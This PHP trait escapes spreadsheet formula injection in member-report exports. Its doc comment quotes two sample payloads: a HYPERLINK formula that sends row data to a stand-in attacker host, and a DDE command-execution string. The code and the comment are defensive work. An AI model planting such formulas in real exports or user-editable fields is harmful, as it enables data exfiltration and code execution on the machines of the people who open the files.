<?php

namespace App\Exports\Concerns;

/**
 * Neutralises spreadsheet formula injection in exported cells.
 *
 * Member names, agencies and positions are text the member edits themselves.
 * A value beginning with "=", "+", "-" or "@" is evaluated as a formula when
 * the export is opened, so a member could put
 *
 *     =HYPERLINK("https://attacker.example/?d="&A1&B1,"View record")
 *
 * in their agency, and the Field Office administrator who exports the members
 * report gets a plausible-looking link that exfiltrates the row when clicked.
 * With DDE enabled — still common on government desktop images —
 * "=cmd|'/c calc'!A1" reaches code execution on that administrator's machine,
 * which turns a member account into a foothold inside the CSC network.
 */
trait EscapesFormulas
{
    /**
     * A leading apostrophe tells Excel and LibreOffice "this cell is text".
     * It is not displayed to the reader, so the export looks unchanged.
     */
    protected function safe(mixed $value): mixed
    {
        if (! is_string($value) || $value === '') {
            return $value;
        }

        // Tab and CR are included because both can lead a cell that a
        // spreadsheet still parses as a formula.
        return preg_match('/^[=+\-@\t\r]/', $value) ? "'".$value : $value;
    }

    /**
     * Convenience for map(), which returns a whole row.
     *
     * @param  array<int, mixed>  $row
     * @return array<int, mixed>
     */
    protected function safeRow(array $row): array
    {
        return array_map($this->safe(...), $row);
    }
}
